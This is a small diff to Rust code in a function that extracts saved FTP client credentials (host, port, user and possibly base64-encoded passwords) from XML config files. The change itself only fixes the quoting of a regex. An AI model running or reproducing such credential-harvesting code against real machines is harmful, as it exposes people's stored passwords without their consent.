@@ -302,7 +302,7 @@ fn extract_ftp_client_credentials() -> Result<Vec<Credential>, String> {
                 let host_re = regex::Regex::new(r"<Host>(.+?)</Host>").ok();
                 let port_re = regex::Regex::new(r"<Port>(\d+)</Port>").ok();
                 let user_re = regex::Regex::new(r"<User>(.+?)</User>").ok();
-                let pass_re = regex::Regex::new(r"<Pass(?: encoding=\"base64\")?>(.+?)</Pass>").ok();
+                let pass_re = regex::Regex::new(r#"<Pass(?: encoding="base64")?>(.+?)</Pass>"#).ok();
 
                 // 简化：收集所有用户名
                 if let Some(ref re) = user_re {
